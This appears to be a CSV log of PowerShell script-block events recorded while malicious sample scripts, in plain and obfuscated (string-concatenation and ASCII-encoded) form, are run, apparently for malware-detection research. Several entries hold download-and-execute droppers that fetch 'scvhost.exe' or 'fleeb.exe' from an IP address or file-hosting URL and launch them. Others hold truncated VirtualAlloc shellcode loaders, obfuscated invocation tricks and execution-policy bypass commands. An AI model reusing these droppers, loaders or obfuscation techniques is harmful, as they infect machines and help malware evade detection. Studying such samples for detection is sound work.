"8/5/2026 8:25:10 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:25:10 AM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/5/2026 8:25:10 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\124.ps1","299"," ('(New-O'+'bject S'+'y'+'st'+'e'+'m.N'+'et.W'+'e'+'bClient).Downl'+'oa'+'dFile'+'(K'+'l'+'5https:/'+'/1fic'+'h'+'ie'+'r.'+'com/?'+'v8w3g7'+'36hjKl5,Kl5fleeb.ex'+'eKl5);S'+'tart-Process Kl5'+'fleeb.'+"
"8/5/2026 8:25:10 AM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\124.ps1'"
"8/5/2026 8:25:03 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:25:03 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\112.ps1","525","('('+'New-O'+'bj'+'ect Syste'+'m.N'+'et.We'+'bCl'+'ient).Do'+'wnl'+'oadFile(ewO'+'ht'+'tp://93'+'.17'+'4'+'.94'+'.13'+'7/~karm'+'a'+'/sc'+'vh'+'os'+'t'+'.exeewO,du'+'e'+'Hhden'+'v:'+'A'+'PPDATA9Sh'+'s"
"8/5/2026 8:25:03 AM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\112.ps1'"
"8/5/2026 8:24:55 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:24:55 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:24:55 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:24:55 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:24:55 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:24:55 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\102.ps1","2647"," & ((gET-VaRiABLE '*Mdr*').name[3,11,2]-JoiN'') ( ('aYUc = '+'dhE[DllImport(liBkernel32.dllliB)]public static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint f"
"8/5/2026 8:24:54 AM","","176","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\102.ps1'"
"8/5/2026 8:24:47 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:24:47 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:24:47 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:24:47 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:24:47 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:24:47 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\82.ps1","2702"," &((geT-variAbLE '*mdR*').naMe[3,11,2]-JOIN'')( ('bA1c = W4O[DllImport(dWDkernel32.dlldWD)]public static ext'+'ern Int'+'Ptr VirtualAlloc(IntPtr'+' lpAddress, uint dwSize, uint flA'+'llocationType,'+'"
"8/5/2026 8:24:47 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\82.ps1'"
"8/5/2026 8:24:42 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:24:42 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:24:42 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:24:42 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:24:41 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:24:41 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\67.ps1","2609","('Uy'+'kc = KCj[DllImport(deEkernel32.dlldeE)]public st'+'atic ex'+'te'+'rn IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint '+'fl'+'AllocationType, uint flProtect);[DllImport(deEkernel32.dllde"
"8/5/2026 8:24:41 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\67.ps1'"
"8/5/2026 8:24:23 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:24:23 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:24:23 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:24:23 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:24:22 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:24:22 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\66.ps1","2640",".( $veRboSEPRefErEnce.TOSTRINg()[1,3]+'x'-JOIn'') ( (('8iwc = u8e[DllImport(QtAkernel32.dllQtA)]public static extern IntPtr VirtualAlloc(IntPtr l'+'pAddress, uint dwSize, uint flAllocationType, uint f"
"8/5/2026 8:24:22 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\66.ps1'"
"8/5/2026 8:24:11 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:24:11 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:24:11 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:24:11 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:24:10 AM","","2446","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:24:10 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\61.ps1","2801"," .( $sheLlId[1]+$ShelLiD[13]+'X') ( ('2p1c = nGW[DllImport(zxakern'+'el32.dllzxa)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImp"
"8/5/2026 8:24:10 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\61.ps1'"
"8/5/2026 8:23:59 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:23:59 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:23:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:23:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:23:59 AM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:23:59 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\52.ps1","3136",". ( $PSHome[21]+$pShOmE[34]+'X')((('Yit6UhT ='+' v3H[DllImport'+'(vhCkernel32.dllvhC)]publ'+'ic static e'+'xtern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uin'+'t flPro"
"8/5/2026 8:23:59 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\52.ps1'"
"8/5/2026 8:23:30 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:23:30 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:23:30 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:23:30 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:23:30 AM","","2244","$qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr"
"8/5/2026 8:23:30 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\14.ps1","2636","(('Wmaqkc = m5d[DllImport(9oxkernel32.dll9ox)]public static extern IntPtr VirtualAlloc(I'+'n'+'tPtr lpAddress, uint dwSize, uint flA'+'llocationTyp'+'e, uint flProtect);[DllImport(9oxkernel32.'+'dll9o"
"8/5/2026 8:23:30 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\14.ps1'"
"8/5/2026 8:23:25 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:23:25 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:23:25 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:23:25 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:23:25 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:23:25 AM","C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1","2678",". ( $ENV:coMSPeC[4,24,25]-joIn'')((('y7zc = YBg[DllImport(iC'+'wkernel32.dlliCw)]public static extern IntPtr'+' VirtualAll'+'oc(IntPtr lpAd'+'dress, uint dwSize, uint flAll'+'ocationType, uint flProte"
"8/5/2026 8:23:25 AM","","175","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\String_Concatenation\malicious\13.ps1'"
"8/5/2026 8:23:13 AM","","9","$global:?"
"8/5/2026 8:23:13 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:23:13 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:23:13 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:23:13 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:23:13 AM","","120","(New-Object System.Net.WebClient).DownloadFile('https://1fichier.com/?v8w3g736hj','fleeb.exe');Start-Process 'fleeb.exe'"
"8/5/2026 8:23:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1","22","{ ([inT]$_-As[cHaR]) }"
"8/5/2026 8:23:13 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1","657","[StRINg]::JOiN('',(( 40 , 78,101 , 119 , 45,79, 98 ,106, 101 , 99, 116, 32, 83 ,121 , 115, 116 ,101, 109, 46, 78 ,101 ,116,46 , 87,101 ,98, 67,108 ,105,101 ,110, 116, 41 , 46 , 68 , 111 ,119 , 110 , 1"
"8/5/2026 8:23:13 AM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\124.ps1'"
"8/5/2026 8:22:48 AM","","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:22:48 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\112.ps1","770","-JOIN[ChaR[]] (40 , 78 ,101 ,119 , 45, 79 ,98 , 106 , 101,99 , 116 ,32,83,121 , 115, 116,101,109 ,46, 78,101,116 ,46,87, 101 , 98,67,108 , 105,101, 110, 116 , 41, 46 ,68 ,111, 119,110 , 108 , 111, 97 "
"8/5/2026 8:22:48 AM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\112.ps1'"
"8/5/2026 8:22:39 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:22:39 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:22:39 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:22:39 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:22:39 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:22:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","25","{ ( [InT] $_-aS [cHar]) }"
"8/5/2026 8:22:39 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1","7757","""$( seT-IteM  'vARIAbLe:OfS' '')""+[sTrinG]( '36t99;32c61V32;39V91}68}108}108x73c109x112:111F114x116;40,34,107V101F114}110:101F108x51c50;46}100t108,108,34;41t93t112t117O98}108}105V99,32V115,116O97;116}"
"8/5/2026 8:22:39 AM","","170","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\102.ps1'"
"8/5/2026 8:22:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:22:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:22:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:22:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:22:31 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:22:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1","20","{ ( [CHar][INt]$_) }"
"8/5/2026 8:22:31 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1","7579"," ( '36_99J32!61!32!39Z91Z68S108u108S73u109%112-111u114-116-40u34S107-101-114!110d101f108d51d50S46J100d108%108Z34J41!93-112d117!98-108J105S99%32u115d116%97_116u105-99f32-101_120J116J101-114u110S32u73Z1"
"8/5/2026 8:22:31 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\82.ps1'"
"8/5/2026 8:22:16 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:22:16 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:22:16 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:22:16 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:22:15 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:22:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1","19","{([CHAR] [int] $_)}"
"8/5/2026 8:22:15 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1","7570"," -JOin ('36X99%32,61Y32-39Q91<68Q108%108Q73<109<112z111!114Y116z40%34%107Y101<114%110<101<108z51z50Q46,100!108P108Y34!41Q93<112-117X98Q108Y105z99Q32Q115!116!97!116Q105P99,32z101Y120!116z101z114Q110Y32"
"8/5/2026 8:22:15 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\67.ps1'"
"8/5/2026 8:22:06 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:22:06 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:22:06 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:22:06 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:22:06 AM","","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:22:06 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\66.ps1","9773"," . ( $env:coMsPEC[4,24,25]-jOIn'') (-JOiN[chAr[]] (36,99,32 ,61, 32, 39 , 91 , 68,108, 108 ,73, 109,112, 111, 114 , 116, 40 ,34,107 , 101 ,114 ,110,101,108, 51,50, 46, 100,108, 108 , 34, 41 , 93 , 112"
"8/5/2026 8:22:06 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\66.ps1'"
"8/5/2026 8:21:56 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:21:56 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:21:56 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:21:56 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:21:56 AM","","2448"," $c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr "
"8/5/2026 8:21:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1","25","{ ( [inT] $_-aS [CHAR]) }"
"8/5/2026 8:21:56 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1","10757"," .( $Env:cOmSpec[4,26,25]-JOin'')("" $(sET-VaRiAbLE  'OFS' '')"" +[sTRiNg]( (36,99,32,61, 32,39 ,91, 68, 108 ,108,73,109,112 ,111,114 ,116, 40,34 , 107, 101, 114, 110 ,101, 108 ,51 , 50 , 46, 100 , 108,"
"8/5/2026 8:21:56 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\61.ps1'"
"8/5/2026 8:21:31 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:21:31 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:21:31 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:21:31 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:21:31 AM","","2711","$6UhT = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:21:30 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\52.ps1","11855"," .( ([stRinG]$VerBOsePReFeREncE)[1,3]+'x'-JOin'') ([chaR[]] ( 36 ,54,85,104, 84 ,32,61,32 , 39, 91,68 , 108 ,108,73, 109 ,112,111 ,114 ,116 , 40,34 , 107 , 101,114,110 ,101, 108 ,51,50 ,46, 100, 108, "
"8/5/2026 8:21:30 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\52.ps1'"
"8/5/2026 8:21:17 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:21:17 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:21:17 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:21:17 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:21:16 AM","","2246"," $qkc = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPt"
"8/5/2026 8:21:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","21","{([int]$_ -As[chAR])}"
"8/5/2026 8:21:16 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1","7777"," "" $( SeT-IteM 'vARiAbLE:ofS'  '')"" +[StRiNg]('36g113E107P99Y32g61}32E39u91}68;108;108u73;109s112u111@114P116;40g34P107E101g114;110P101P108s51E50P46E100E108s108g34_41_93E112_117g98s108Y105P99_32g115_1"
"8/5/2026 8:21:16 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\14.ps1'"
"8/5/2026 8:21:02 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:21:02 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:21:02 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:21:02 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:21:02 AM","","2245","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:21:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","19","{([CHar] [iNT] $_)}"
"8/5/2026 8:21:02 AM","C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1","7664","[stRIng]::joIn('' ,('36b99k32P61A32P39Z91v68&108_108b73k109P112_111b114Z116v40b34Z107v101_114I110A101F108b51v50_46Z100b108_108b34k41F93_112b117Z98A108P105_99k32Z115A116I97&116b105F99P32I101_120I116Z10"
"8/5/2026 8:21:02 AM","","169","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set_obf\ASCII_Encoding\malicious\13.ps1'"
"8/5/2026 8:20:59 AM","","9","$global:?"
"8/5/2026 8:20:58 AM","","29","Write-Host 'Final result: 1';"
"8/5/2026 8:20:38 AM","C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1","159","(New-Object System.Net.WebClient).DownloadFile('http://93.174.94.137/~karma/scvhost.exe',""$env:APPDATA\scvhost.exe"");Start-Process (""$env:APPDATA\scvhost.exe"")"
"8/5/2026 8:20:37 AM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\112.ps1'"
"8/5/2026 8:20:21 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:21 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:20:21 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:20:21 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:20:21 AM","C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:20:21 AM","","151","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\102.ps1'"
"8/5/2026 8:20:09 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:09 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:20:09 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:20:09 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:20:09 AM","C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:20:09 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\82.ps1'"
"8/5/2026 8:20:00 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:20:00 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:59 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:59 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
"8/5/2026 8:19:59 AM","C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1","2231","$c = '[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr C"
"8/5/2026 8:19:59 AM","","150","if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\TA\project-ta\data_spliting\test_set\malicious\67.ps1'"
"8/5/2026 8:19:18 AM","","44","{ Set-StrictMode -Version 1; $_.OriginInfo }"
"8/5/2026 8:19:18 AM","","55","{ Set-StrictMode -Version 1; $_.ErrorCategory_Message }"
"8/5/2026 8:19:18 AM","","78","{ Set-StrictMode -Version 1; $this.Exception.InnerException.PSMessageDetails }"
"8/5/2026 8:19:18 AM","","50","{ Set-StrictMode -Version 1; $_.PSMessageDetails }"
